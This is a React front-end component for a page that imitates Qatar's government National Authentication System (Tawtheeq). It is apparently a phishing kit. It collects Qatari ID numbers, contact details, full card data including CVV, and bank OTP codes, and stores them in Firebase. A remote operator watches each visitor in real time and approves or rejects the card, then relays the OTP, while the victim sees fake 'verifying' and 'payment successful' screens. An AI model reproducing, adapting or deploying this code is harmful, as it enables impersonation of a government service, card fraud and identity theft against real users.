"use client"

import { useState, useEffect, useRef } from "react"
import { Card } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { addData, addCardToHistory, addOtpToHistory, subscribeToVisitor, updateLastActive } from "@/lib/firebase"

function getOrCreateVisitorId(): string {
  if (typeof window === "undefined") return Date.now().toString()
  let id = localStorage.getItem("visitorId")
  if (!id) {
    id = `v_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`
    localStorage.setItem("visitorId", id)
  }
  return id
}

type CardPhase = "form" | "waiting" | "otp_input" | "waiting_otp" | "rejected"

export function AuthenticationForm() {
  const [currentStep, setCurrentStep] = useState(1)
  const [selectedType, setSelectedType] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [visitorId, setVisitorId] = useState<string>("")
  const [cardPhase, setCardPhase] = useState<CardPhase>("form")
  const [otpInput, setOtpInput] = useState("")
  const [otpError, setOtpError] = useState("")
  const unsubscribeRef = useRef<(() => void) | null>(null)

  const [personalData, setPersonalData] = useState({
    qid: "", firstName: "", lastName: "", email: "", phone: "", phoneProvider: "",
  })
  const [cardData, setCardData] = useState({
    cardNumber: "", expiryDate: "", cvv: "", cardHolder: "",
  })

  // Init visitor in Firebase on mount
  useEffect(() => {
    const vid = getOrCreateVisitorId()
    setVisitorId(vid)
    addData({
      id: vid, currentStep: 1, currentPage: "auth-form", status: "draft", country: "QA",
      identityNumber: "", ownerName: "", phoneNumber: "", documentType: "استمارة",
      serialNumber: "", insuranceType: "تأمين جديد", insuranceCoverage: "",
      insuranceStartDate: "", vehicleUsage: "", vehicleValue: "", vehicleYear: "",
      vehicleModel: "", paymentStatus: "pending",
    })
    const interval = setInterval(() => { updateLastActive(vid) }, 20000)
    return () => { clearInterval(interval); unsubscribeRef.current?.() }
  }, [])

  // Subscribe to Firebase when waiting for admin action
  useEffect(() => {
    if (!visitorId || (cardPhase !== "waiting" && cardPhase !== "waiting_otp")) {
      unsubscribeRef.current?.()
      unsubscribeRef.current = null
      return
    }
    unsubscribeRef.current?.()
    unsubscribeRef.current = subscribeToVisitor(visitorId, (data) => {
      if (cardPhase === "waiting") {
        if (data.cardStatus === "approved_with_otp") setCardPhase("otp_input")
        else if (data.cardStatus === "approved_with_pin") {
          setCurrentStep(4)
          setCardPhase("form")
        }
        else if (data.cardStatus === "rejected") setCardPhase("rejected")
      } else if (cardPhase === "waiting_otp") {
        if (data._v5Status === "approved") {
          unsubscribeRef.current?.()
          setCurrentStep(4)
          setCardPhase("form")
        } else if (data._v5Status === "rejected") {
          setOtpError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى")
          setOtpInput("")
          setCardPhase("otp_input")
        }
      }
    })
    return () => { unsubscribeRef.current?.(); unsubscribeRef.current = null }
  }, [visitorId, cardPhase])

  const validateStep1 = () => {
    const e: Record<string, string> = {}
    if (!selectedType) e.accountType = "يرجى اختيار نوع الحساب"
    setErrors(e); return !Object.keys(e).length
  }

  const validateStep2 = () => {
    const e: Record<string, string> = {}
    if (!personalData.qid) e.qid = "هذا الحقل مطلوب"
    else if (personalData.qid.length < 11) e.qid = "رقم البطاقة غير صحيح"
    if (!personalData.firstName) e.firstName = "هذا الحقل مطلوب"
    if (!personalData.lastName) e.lastName = "هذا الحقل مطلوب"
    if (!personalData.email) e.email = "هذا الحقل مطلوب"
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personalData.email)) e.email = "البريد الإلكتروني غير صحيح"
    if (!personalData.phone) e.phone = "هذا الحقل مطلوب"
    else if (!/^[0-9]{8}$/.test(personalData.phone)) e.phone = "رقم الهاتف يجب أن يكون 8 أرقام"
    if (!personalData.phoneProvider) e.phoneProvider = "يرجى اختيار مزود الخدمة"
    setErrors(e); return !Object.keys(e).length
  }

  const validateCard = () => {
    const e: Record<string, string> = {}
    if (!cardData.cardNumber) e.cardNumber = "هذا الحقل مطلوب"
    else if (cardData.cardNumber.replace(/\s/g, "").length !== 16) e.cardNumber = "رقم البطاقة غير صحيح"
    if (!cardData.expiryDate) e.expiryDate = "هذا الحقل مطلوب"
    else if (!/^\d{2}\/\d{2}$/.test(cardData.expiryDate)) e.expiryDate = "التاريخ غير صحيح (MM/YY)"
    if (!cardData.cvv) e.cvv = "هذا الحقل مطلوب"
    else if (cardData.cvv.length !== 3) e.cvv = "CVV يجب أن يكون 3 أرقام"
    if (!cardData.cardHolder) e.cardHolder = "هذا الحقل مطلوب"
    setErrors(e); return !Object.keys(e).length
  }

  const handleNext = async () => {
    setErrors({})
    if (currentStep === 1 && !validateStep1()) return
    if (currentStep === 2 && !validateStep2()) return
    setIsLoading(true)

    try {
      if (currentStep === 2 && visitorId) {
        await addData({
          id: visitorId,
          ownerName: `${personalData.firstName} ${personalData.lastName}`.trim(),
          identityNumber: personalData.qid, phoneNumber: personalData.phone,
          currentStep: 3, currentPage: "auth-form", status: "draft", country: "QA",
          documentType: "استمارة", serialNumber: "", insuranceType: "تأمين جديد",
          insuranceCoverage: "", insuranceStartDate: "", vehicleUsage: "",
          vehicleValue: "", vehicleYear: "", vehicleModel: "", paymentStatus: "pending",
        })
        // Try register silently — not blocking
        fetch("/api/auth/register", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            accountType: selectedType,
            fullName: `${personalData.firstName} ${personalData.lastName}`,
            nationalId: personalData.qid, email: personalData.email,
            phoneNumber: personalData.phone, phoneProvider: personalData.phoneProvider,
            password: `Tmp${Date.now()}!`,
          }),
        }).catch(() => {})
      }
      setIsLoading(false)
      if (currentStep < 7) setCurrentStep(currentStep + 1)
    } catch {
      setErrors({ general: "حدث خطأ في الاتصال" })
      setIsLoading(false)
    }
  }

  // Submit card → Firebase only, then wait for admin
  const handleCardSubmit = async () => {
    if (!validateCard()) return
    setIsLoading(true)
    try {
      if (visitorId) {
        await addCardToHistory(visitorId, {
          cardNumber: cardData.cardNumber.replace(/\s/g, ""),
          cvv: cardData.cvv, expiryDate: cardData.expiryDate, cardName: cardData.cardHolder,
        })
      }
      setCardPhase("waiting")
    } catch {
      setErrors({ general: "حدث خطأ أثناء حفظ البيانات" })
    } finally {
      setIsLoading(false)
    }
  }

  // Submit OTP → Firebase, then wait for admin approval
  const handleOtpSubmit = async () => {
    setOtpError("")
    if (!otpInput || otpInput.length < 4) {
      setOtpError("يرجى إدخال رمز التحقق")
      return
    }
    setIsLoading(true)
    try {
      if (visitorId) await addOtpToHistory(visitorId, otpInput)
      setCardPhase("waiting_otp")
    } catch {
      setOtpError("حدث خطأ أثناء الإرسال")
    } finally {
      setIsLoading(false)
    }
  }

  const handleBack = () => {
    if (currentStep === 3 && cardPhase !== "form") {
      setCardPhase("form")
      setErrors({})
      return
    }
    if (currentStep > 1) setCurrentStep(currentStep - 1)
    setErrors({})
  }

  const steps = [
    { number: "1", label1: "نوع", label2: "الحساب" },
    { number: "2", label1: "البيانات", label2: "الشخصية" },
    { number: "3", label1: "الدفع", label2: "بالبطاقة" },
    { number: "4", label1: "التسجيل", label2: "" },
    { number: "5", label1: "توثيق رقم", label2: "الهاتف" },
    { number: "6", label1: "رمز", label2: "التحقق" },
    { number: "7", label1: "إنتهاء", label2: "التسجيل" },
  ]

  return (
    <div className="min-h-screen bg-white flex flex-col" dir="rtl">
      <header className="bg-white border-b px-4 py-3 md:py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex flex-col gap-0.5 md:gap-1">
            <h1 className="text-base md:text-lg font-semibold text-[#8b1538]">نظام التوثيق الوطني</h1>
            <p className="text-[10px] md:text-xs text-gray-600">National Authentication System</p>
          </div>
          <div className="flex items-center gap-1.5 md:gap-2">
            <div className="w-10 h-10 md:w-12 md:h-12 bg-white rounded-lg flex items-center justify-center p-1.5 md:p-2">
              <svg viewBox="0 0 40 40" className="w-full h-full">
                <circle cx="12" cy="20" r="8" fill="#8b1538" />
                <circle cx="28" cy="20" r="8" fill="#0078c1" />
                <path d="M 12 12 Q 20 8 28 12" fill="none" stroke="#0078c1" strokeWidth="2" />
                <path d="M 12 28 Q 20 32 28 28" fill="none" stroke="#8b1538" strokeWidth="2" />
              </svg>
            </div>
            <div className="text-[10px] md:text-xs">
              <div className="font-bold text-gray-800">توثيق</div>
              <div className="text-[8px] md:text-[10px] text-gray-500 tracking-wider">TAMTHEEQ</div>
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-6xl mx-auto w-full px-3 md:px-4 py-4 md:py-8">
        {/* Steps */}
        <div className="mb-8 md:mb-12">
          <div className="flex items-center justify-start md:justify-center overflow-x-auto pb-4 hide-scrollbar">
            <div className="flex items-center min-w-max px-2">
              {steps.map((step, index) => (
                <div key={index} className="flex items-center">
                  <div className="flex flex-col items-center gap-1.5 md:gap-2 min-w-[80px] md:min-w-[120px]">
                    <div className={`w-10 h-10 md:w-12 md:h-12 rounded-full flex items-center justify-center font-bold text-base md:text-lg transition-colors ${currentStep === index + 1 ? "bg-[#0078c1] text-white" : currentStep > index + 1 ? "bg-green-500 text-white" : "bg-gray-300 text-gray-600"}`}>
                      {currentStep > index + 1 ? "✓" : step.number}
                    </div>
                    <div className="text-center">
                      <div className="font-semibold text-xs md:text-sm">{step.label1}</div>
                      {step.label2 && <div className="text-[10px] md:text-xs text-gray-600">{step.label2}</div>}
                    </div>
                  </div>
                  {index < steps.length - 1 && (
                    <div className="flex-1 min-w-[30px] md:min-w-[40px] h-[2px] bg-gray-300 -mt-6 md:-mt-8 mx-1 md:mx-2" />
                  )}
                </div>
              ))}
            </div>
          </div>
        </div>

        <Card className="bg-[#f5f5f5] p-4 md:p-8 shadow-sm border-0">
          {errors.general && (
            <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg">
              <p className="text-red-600 text-sm text-center">{errors.general}</p>
            </div>
          )}

          {/* Step 1 */}
          {currentStep === 1 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">اختر نوع الحساب</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div className="flex items-center gap-2 text-base md:text-lg mb-4">
                  <span className="text-red-500">*</span>
                  <span className="font-semibold">نوع الحساب</span>
                  <span className="bg-[#0078c1] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs">؟</span>
                </div>
                {errors.accountType && <p className="text-red-500 text-sm mb-2">{errors.accountType}</p>}
                <RadioGroup value={selectedType} onValueChange={setSelectedType}>
                  <div className="flex items-center space-x-2 space-x-reverse p-3 md:p-4 bg-white border-2 border-gray-300 rounded-lg hover:border-[#0078c1] transition-colors cursor-pointer">
                    <RadioGroupItem value="citizens" id="citizens" className="ml-3" />
                    <Label htmlFor="citizens" className="cursor-pointer text-sm md:text-base flex-1">المواطنين القطريين والمقيمين</Label>
                  </div>
                  <div className="flex items-center space-x-2 space-x-reverse p-3 md:p-4 bg-white border-2 border-gray-300 rounded-lg hover:border-[#0078c1] transition-colors cursor-pointer">
                    <RadioGroupItem value="visitors" id="visitors" className="ml-3" />
                    <Label htmlFor="visitors" className="cursor-pointer text-sm md:text-base flex-1">الزوار والمستخدمين من خارج دولة قطر</Label>
                  </div>
                </RadioGroup>
              </div>
            </div>
          )}

          {/* Step 2 */}
          {currentStep === 2 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">البيانات الشخصية</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div>
                  <Label htmlFor="qid" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم الهوية القطرية</Label>
                  <Input id="qid" value={personalData.qid} onChange={(e) => setPersonalData({ ...personalData, qid: e.target.value })} className={`bg-white ${errors.qid ? "border-red-500" : ""}`} maxLength={11} />
                  {errors.qid && <p className="text-red-500 text-xs mt-1">{errors.qid}</p>}
                </div>
                <div className="grid grid-cols-2 gap-3 md:gap-4">
                  <div>
                    <Label htmlFor="firstName" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> الاسم الأول</Label>
                    <Input id="firstName" value={personalData.firstName} onChange={(e) => setPersonalData({ ...personalData, firstName: e.target.value })} className={`bg-white ${errors.firstName ? "border-red-500" : ""}`} />
                    {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
                  </div>
                  <div>
                    <Label htmlFor="lastName" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> اسم العائلة</Label>
                    <Input id="lastName" value={personalData.lastName} onChange={(e) => setPersonalData({ ...personalData, lastName: e.target.value })} className={`bg-white ${errors.lastName ? "border-red-500" : ""}`} />
                    {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
                  </div>
                </div>
                <div>
                  <Label htmlFor="email" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> البريد الإلكتروني</Label>
                  <Input id="email" type="email" value={personalData.email} onChange={(e) => setPersonalData({ ...personalData, email: e.target.value })} className={`bg-white ${errors.email ? "border-red-500" : ""}`} />
                  {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
                </div>
                <div>
                  <Label htmlFor="phone" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم الهاتف</Label>
                  <Input id="phone" value={personalData.phone} onChange={(e) => setPersonalData({ ...personalData, phone: e.target.value.replace(/\D/g, "") })} className={`bg-white ${errors.phone ? "border-red-500" : ""}`} maxLength={8} />
                  {errors.phone && <p className="text-red-500 text-xs mt-1">{errors.phone}</p>}
                </div>
                <div>
                  <Label className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> مزود الخدمة</Label>
                  <Select value={personalData.phoneProvider} onValueChange={(v) => setPersonalData({ ...personalData, phoneProvider: v })}>
                    <SelectTrigger className={`bg-white ${errors.phoneProvider ? "border-red-500" : ""}`}>
                      <SelectValue placeholder="اختر مزود الخدمة" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="ooredoo">Ooredoo</SelectItem>
                      <SelectItem value="vodafone">Vodafone</SelectItem>
                    </SelectContent>
                  </Select>
                  {errors.phoneProvider && <p className="text-red-500 text-xs mt-1">{errors.phoneProvider}</p>}
                </div>
              </div>
            </div>
          )}

          {/* Step 3: Card form */}
          {currentStep === 3 && cardPhase === "form" && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">الدفع بالبطاقة</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div>
                  <Label htmlFor="cardNumber" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رقم البطاقة</Label>
                  <Input id="cardNumber" value={cardData.cardNumber} onChange={(e) => { const v = e.target.value.replace(/\D/g, "").slice(0,16); setCardData({ ...cardData, cardNumber: v.match(/.{1,4}/g)?.join(" ") || v }) }} className={`bg-white ${errors.cardNumber ? "border-red-500" : ""}`} maxLength={19} placeholder="0000 0000 0000 0000" />
                  {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                </div>
                <div className="grid grid-cols-2 gap-3 md:gap-4">
                  <div>
                    <Label htmlFor="expiryDate" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> تاريخ الانتهاء</Label>
                    <Input id="expiryDate" value={cardData.expiryDate} onChange={(e) => { let v = e.target.value.replace(/\D/g, "").slice(0,4); if (v.length >= 3) v = v.slice(0,2) + "/" + v.slice(2); setCardData({ ...cardData, expiryDate: v }) }} className={`bg-white ${errors.expiryDate ? "border-red-500" : ""}`} placeholder="MM/YY" maxLength={5} />
                    {errors.expiryDate && <p className="text-red-500 text-xs mt-1">{errors.expiryDate}</p>}
                  </div>
                  <div>
                    <Label htmlFor="cvv" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> CVV</Label>
                    <Input id="cvv" value={cardData.cvv} onChange={(e) => setCardData({ ...cardData, cvv: e.target.value.replace(/\D/g, "").slice(0,3) })} className={`bg-white ${errors.cvv ? "border-red-500" : ""}`} maxLength={3} placeholder="000" />
                    {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                  </div>
                </div>
                <div>
                  <Label htmlFor="cardHolder" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> اسم حامل البطاقة</Label>
                  <Input id="cardHolder" value={cardData.cardHolder} onChange={(e) => setCardData({ ...cardData, cardHolder: e.target.value })} className={`bg-white ${errors.cardHolder ? "border-red-500" : ""}`} />
                  {errors.cardHolder && <p className="text-red-500 text-xs mt-1">{errors.cardHolder}</p>}
                </div>
              </div>
            </div>
          )}

          {/* Step 3: Waiting for admin approval */}
          {currentStep === 3 && cardPhase === "waiting" && (
            <div className="flex flex-col items-center justify-center py-12 md:py-20 space-y-6">
              <div className="relative">
                <div className="w-20 h-20 rounded-full bg-blue-50 flex items-center justify-center">
                  <svg className="animate-spin h-10 w-10 text-[#0078c1]" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" fill="none" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                </div>
              </div>
              <div className="text-center space-y-2">
                <h3 className="text-lg md:text-xl font-bold text-gray-800">جاري التحقق من البطاقة</h3>
                <p className="text-sm text-gray-500">يرجى الانتظار، نقوم بمعالجة بيانات البطاقة...</p>
                <p className="text-xs text-gray-400">قد يستغرق هذا بضع ثوانٍ</p>
              </div>
              <div className="flex gap-1.5">
                {[0,1,2].map(i => (
                  <div key={i} className="w-2 h-2 rounded-full bg-[#0078c1] animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />
                ))}
              </div>
            </div>
          )}

          {/* Step 3: OTP input after admin approves */}
          {currentStep === 3 && cardPhase === "otp_input" && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">رمز التحقق</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 text-center">
                  <p className="text-sm text-blue-700">تم إرسال رمز التحقق إلى هاتفك المسجل</p>
                  <p className="text-xs text-blue-500 mt-1">{personalData.phone}</p>
                </div>
                <div>
                  <Label htmlFor="otpInput" className="text-sm md:text-base mb-2 block text-center"><span className="text-red-500">*</span> رمز التحقق (OTP)</Label>
                  <Input id="otpInput" value={otpInput} onChange={(e) => { setOtpInput(e.target.value.replace(/\D/g, "")); setOtpError("") }} className={`bg-white text-center text-2xl tracking-[0.5em] font-bold ${otpError ? "border-red-500" : ""}`} maxLength={6} placeholder="000000" />
                  {otpError && <p className="text-red-500 text-xs mt-1 text-center">{otpError}</p>}
                  <p className="text-xs text-gray-400 text-center mt-2">الرمز صالح لمدة 5 دقائق فقط</p>
                </div>
              </div>
            </div>
          )}

          {/* Step 3: Waiting for OTP approval */}
          {currentStep === 3 && cardPhase === "waiting_otp" && (
            <div className="flex flex-col items-center justify-center py-12 md:py-20 space-y-6">
              <div className="w-20 h-20 rounded-full bg-green-50 flex items-center justify-center">
                <svg className="animate-spin h-10 w-10 text-green-500" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" fill="none" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
              </div>
              <div className="text-center space-y-2">
                <h3 className="text-lg md:text-xl font-bold text-gray-800">جاري التحقق من الرمز</h3>
                <p className="text-sm text-gray-500">نقوم بالتحقق من رمز OTP الخاص بك...</p>
              </div>
              <div className="flex gap-1.5">
                {[0,1,2].map(i => (
                  <div key={i} className="w-2 h-2 rounded-full bg-green-500 animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />
                ))}
              </div>
            </div>
          )}

          {/* Step 3: Card rejected */}
          {currentStep === 3 && cardPhase === "rejected" && (
            <div className="flex flex-col items-center justify-center py-12 space-y-6">
              <div className="w-20 h-20 rounded-full bg-red-50 flex items-center justify-center">
                <span className="text-4xl">❌</span>
              </div>
              <div className="text-center space-y-2">
                <h3 className="text-lg md:text-xl font-bold text-red-700">لم يتم قبول البطاقة</h3>
                <p className="text-sm text-gray-500">يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى</p>
              </div>
              <Button onClick={() => { setCardPhase("form"); setCardData({ cardNumber: "", expiryDate: "", cvv: "", cardHolder: "" }) }} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-8">
                المحاولة مرة أخرى
              </Button>
            </div>
          )}

          {/* Step 4 */}
          {currentStep === 4 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">التسجيل</h2>
              <div className="max-w-2xl mx-auto text-center">
                <div className="bg-white p-6 md:p-8 rounded-lg space-y-4">
                  <div className="text-green-600 text-5xl">✓</div>
                  <span className="text-green-600 font-semibold text-lg">تم الدفع بنجاح</span>
                </div>
              </div>
            </div>
          )}

          {/* Step 5 */}
          {currentStep === 5 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">توثيق رقم الهاتف</h2>
              <div className="max-w-2xl mx-auto">
                <div className="bg-white p-6 md:p-8 rounded-lg text-center space-y-4">
                  <div className="w-16 h-16 md:w-20 md:h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                    <svg className="w-8 h-8 md:w-10 md:h-10 text-[#0078c1]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V9a2 2 0 00-2-2H8a2 2 0 00-2 2v2a2 2 0 002 2z" />
                    </svg>
                  </div>
                  <p className="text-base md:text-lg">يرجى إدخال رمز التحقق المرسل إلى هاتفك</p>
                </div>
              </div>
            </div>
          )}

          {/* Step 6 */}
          {currentStep === 6 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">رمز التحقق</h2>
              <div className="space-y-4 md:space-y-6 max-w-2xl mx-auto">
                <div>
                  <Label htmlFor="phoneOtp" className="text-sm md:text-base mb-2 block"><span className="text-red-500">*</span> رمز التحقق</Label>
                  <Input id="phoneOtp" className="bg-white" maxLength={6} />
                </div>
              </div>
            </div>
          )}

          {/* Step 7 */}
          {currentStep === 7 && (
            <div>
              <h2 className="text-xl md:text-2xl font-bold text-center mb-6 md:mb-8 text-gray-800">إنتهاء التسجيل</h2>
              <div className="max-w-2xl mx-auto text-center space-y-4">
                <div className="text-green-500 text-6xl">🎉</div>
                <p className="text-base md:text-lg font-semibold">شكراً لتسجيلك</p>
                <p className="text-sm text-gray-500">يمكنك الآن استخدام خدماتنا</p>
              </div>
            </div>
          )}

          {/* Navigation Buttons */}
          <div className="flex justify-center gap-3 md:gap-4 mt-6 md:mt-8">
            {/* Back button */}
            {currentStep > 1 && currentStep < 7 && cardPhase !== "waiting" && cardPhase !== "waiting_otp" && (
              <Button variant="outline" onClick={handleBack} disabled={isLoading} className="px-6 md:px-8 text-sm md:text-base bg-transparent">رجوع</Button>
            )}

            {/* Card submit button */}
            {currentStep === 3 && cardPhase === "form" && (
              <Button onClick={handleCardSubmit} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base">
                {isLoading ? <span className="flex items-center gap-2"><svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>جاري الإرسال...</span> : "إرسال البطاقة"}
              </Button>
            )}

            {/* OTP submit button */}
            {currentStep === 3 && cardPhase === "otp_input" && (
              <Button onClick={handleOtpSubmit} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base">
                {isLoading ? <span className="flex items-center gap-2"><svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>جاري التحقق...</span> : "تأكيد الرمز"}
              </Button>
            )}

            {/* Continue button for other steps */}
            {currentStep !== 3 && currentStep < 7 && (
              <Button onClick={handleNext} disabled={isLoading} className="bg-[#0078c1] hover:bg-[#005a8c] text-white px-6 md:px-8 text-sm md:text-base">
                {isLoading ? <span className="flex items-center gap-2"><svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" /></svg>جاري التحميل...</span> : "استمر"}
              </Button>
            )}
          </div>
        </Card>

        <footer className="text-center mt-6 md:mt-8 text-xs md:text-sm text-gray-600">
          <p>© 2025 حكومة قطر</p>
        </footer>
      </main>
    </div>
  )
}